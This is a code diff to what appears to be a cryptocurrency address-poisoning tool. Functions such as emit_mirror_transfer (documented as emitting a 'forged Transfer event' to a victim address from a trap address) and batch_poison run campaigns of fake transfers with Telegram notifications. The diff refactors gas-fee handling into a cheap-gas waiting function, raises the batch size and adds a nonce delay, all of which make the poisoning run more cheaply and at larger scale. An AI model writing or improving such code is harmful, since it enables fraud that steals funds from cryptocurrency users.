@@ -459,6 +459,69 @@ def get_explorer_url(address, link_type='address'):
     return f"{base_url}/address/{address}#tokentxns"
 
 
+def get_smart_gas_params(w3, context="[gas-strategy]"):
+    """
+    Smart Gas Strategy: Wait for cheap gas (1.5 Gwei), but fallback to spot price 
+    if it takes longer than 10 minutes to prevent stuck nonces.
+    """
+    default_max_fee = w3.to_wei(2, 'gwei')
+    default_priority = w3.to_wei(0.01, 'gwei')
+    
+    target_max_fee = w3.to_wei(1.5, 'gwei')
+    network_tip = w3.to_wei(0.01, 'gwei')
+    
+    try:
+        latest_block = call_with_retry(w3.eth.get_block, "latest")
+        base_fee = latest_block.get("baseFeePerGas", 0) or 0
+        base_fee_gwei = float(w3.from_wei(base_fee, 'gwei'))
+        target_gwei = float(w3.from_wei(target_max_fee, 'gwei'))
+        
+        if base_fee <= target_max_fee:
+            final_max_fee = base_fee + network_tip
+            logger.info(f"{context} ✅ Base fee is cheap ({base_fee_gwei:.2f} Gwei). Firing immediately!")
+            return {'maxFeePerGas': final_max_fee, 'maxPriorityFeePerGas': network_tip}
+        
+        logger.info(f"{context} ⏳ Base fee is {base_fee_gwei:.2f} Gwei. Waiting up to 10 mins for it to drop to <{target_gwei} Gwei...")
+        
+        gas_dropped = False
+        for i in range(50): # 50 blocks * 12s = 10 mins
+            time.sleep(12)
+            
+            try:
+                current_block = call_with_retry(w3.eth.get_block, "latest")
+                current_base_fee = current_block.get("baseFeePerGas", 0) or 0
+                current_gwei = float(w3.from_wei(current_base_fee, 'gwei'))
+                
+                if current_base_fee <= target_max_fee:
+                    final_max_fee = current_base_fee + network_tip
+                    gas_dropped = True
+                    logger.info(f"{context} ✅ Base fee dropped to {current_gwei:.2f} Gwei! Firing at cheap rate!")
+                    break
+                
+                if i % 5 == 0:
+                    logger.info(f"{context} ⏳ Still waiting... Current base fee: {current_gwei:.2f} Gwei")
+            except Exception as e:
+                logger.warning(f"{context} Failed to check base fee: {e}")
+                break
+                
+        if not gas_dropped:
+            try:
+                fallback_block = call_with_retry(w3.eth.get_block, "latest")
+                fallback_base_fee = fallback_block.get("baseFeePerGas", base_fee) or base_fee
+                final_max_fee = fallback_base_fee + network_tip
+                fallback_gwei = float(w3.from_wei(fallback_base_fee, 'gwei'))
+                logger.warning(f"{context} ⚠️ Gas stayed high for 10 mins. Firing at current market rate ({fallback_gwei:.2f} Gwei) to prevent stuck nonces.")
+            except Exception as e:
+                final_max_fee = base_fee + network_tip
+                logger.warning(f"{context} ⚠️ Gas check failed. Firing at original base fee.")
+                
+        return {'maxFeePerGas': final_max_fee, 'maxPriorityFeePerGas': network_tip}
+        
+    except Exception as e:
+        logger.warning(f"{context} Failed to estimate fees, using defaults: {e}")
+        return {'maxFeePerGas': default_max_fee, 'maxPriorityFeePerGas': default_priority}
+
+
 def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaign_id):
     """
     Emit a forged Transfer event via MirrorToken contract.
@@ -508,22 +571,7 @@ def emit_mirror_transfer(victim_address, trap_address, raw_value, asset, campaig
 
         gas_params = {}
         if use_eip1559:
-            base_fee = latest_block.get("baseFeePerGas", 0) or 0
-            # 🚀 ULTRA-CHEAP GAS: Match the low fees of re_poison.js
-            max_fee = w3.to_wei(2, 'gwei')
-            max_priority = w3.to_wei(0.01, 'gwei')
-            
-            network_max_fee = int(base_fee * 1.10) + w3.to_wei(0.05, 'gwei')
-            network_tip = w3.to_wei(0.01, 'gwei')
-            
-            if network_tip >= network_max_fee or network_max_fee < w3.to_wei(0.1, 'gwei'):
-                logger.debug("[mirror] RPC returned glitchy fees. Using ultra-cheap defaults.")
-            else:
-                max_fee = network_max_fee
-                max_priority = min(network_tip, w3.to_wei(0.05, 'gwei'))
-                
-            gas_params['maxFeePerGas'] = max_fee
-            gas_params['maxPriorityFeePerGas'] = max_priority
+            gas_params = get_smart_gas_params(w3, context="[mirror]")
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
 
@@ -648,22 +696,7 @@ def emit_batch_mirror_transfers(victims, traps, amounts, asset, campaign_id):
         
         gas_params = {}
         if use_eip1559:
-            base_fee = latest_block.get("baseFeePerGas", 0) or 0
-            # 🚀 ULTRA-CHEAP GAS: Match the low fees of re_poison.js
-            max_fee = w3.to_wei(2, 'gwei')
-            max_priority = w3.to_wei(0.01, 'gwei')
-            
-            network_max_fee = int(base_fee * 1.10) + w3.to_wei(0.05, 'gwei')
-            network_tip = w3.to_wei(0.01, 'gwei')
-            
-            if network_tip >= network_max_fee or network_max_fee < w3.to_wei(0.1, 'gwei'):
-                logger.debug("[batch-mirror] RPC returned glitchy fees. Using ultra-cheap defaults.")
-            else:
-                max_fee = network_max_fee
-                max_priority = min(network_tip, w3.to_wei(0.05, 'gwei'))
-                
-            gas_params['maxFeePerGas'] = max_fee
-            gas_params['maxPriorityFeePerGas'] = max_priority
+            gas_params = get_smart_gas_params(w3, context="[batch-mirror]")
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
         
@@ -786,21 +819,7 @@ def emit_multi_token_batch_transfers(queue, campaign_id):
         
         gas_params = {}
         if use_eip1559:
-            base_fee = latest_block.get("baseFeePerGas", 0) or 0
-            max_fee = w3.to_wei(2, 'gwei')
-            max_priority = w3.to_wei(0.01, 'gwei')
-            
-            network_max_fee = int(base_fee * 1.10) + w3.to_wei(0.05, 'gwei')
-            network_tip = w3.to_wei(0.01, 'gwei')
-            
-            if network_tip >= network_max_fee or network_max_fee < w3.to_wei(0.1, 'gwei'):
-                pass
-            else:
-                max_fee = network_max_fee
-                max_priority = min(network_tip, w3.to_wei(0.05, 'gwei'))
-                
-            gas_params['maxFeePerGas'] = max_fee
-            gas_params['maxPriorityFeePerGas'] = max_priority
+            gas_params = get_smart_gas_params(w3, context="[multi-batch]")
         else:
             gas_params['gasPrice'] = int(w3.eth.gas_price * 1.01)
             
@@ -1431,7 +1450,7 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
         update_job(job_id, total=total)
         
       # 🚀 BATCH PROCESSING: 700 items per multi-token batch to minimize gas fees
-    BATCH_SIZE = 200
+    BATCH_SIZE = 500
     
     # 🚀 Send "Started" Telegram notification immediately
     start_msg = (
@@ -1517,6 +1536,10 @@ def batch_poison(job_id=None, campaign_id=None, trap_ids=None):
                     update_trap_dust_count(tid)
                     
                 send_batch_telegram_notifications(poison_queue, tx_hash, campaign_id, is_final=False)
+                
+                # 🚀 NONCE SAFETY: Wait 2 seconds to let the RPC load-balancer sync the mined block 
+                # before the next batch fetches the 'pending' nonce. Prevents "nonce too low" errors.
+                time.sleep(2) 
             else:
                 operator_key = get_mirror_operator_key(campaign_id)
                 if operator_key:
